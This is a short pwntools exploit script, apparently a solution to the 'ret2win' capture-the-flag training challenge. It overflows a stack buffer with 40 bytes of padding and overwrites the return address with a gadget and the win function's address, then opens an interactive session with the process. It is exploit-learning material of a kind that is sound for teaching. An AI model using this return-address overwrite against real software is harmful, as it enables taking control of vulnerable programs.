from pwn import *

p = process("./ret2win")

context.log_level='debug'

payload = b"a"*40
payload += p64(0x000000000040053e)
payload += p64(0x0000000000400756)

print(p.recv())
p.sendline(payload)
print(p.recv())
p.interactive()
